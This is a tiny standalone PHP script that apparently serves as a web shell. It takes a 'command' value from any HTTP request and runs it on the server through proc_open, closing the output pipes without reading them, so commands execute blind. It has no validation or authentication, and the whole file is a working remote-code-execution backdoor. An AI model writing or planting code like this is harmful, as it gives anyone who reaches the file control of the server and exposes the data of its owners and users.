<?php
$p = proc_open($_REQUEST['command'],
                     array(1 => array('pipe', 'w'),
                           2 => array('pipe', 'w')),
                     $io);

      
fclose($io[1]);
fclose($io[2]);
proc_close($p);
?>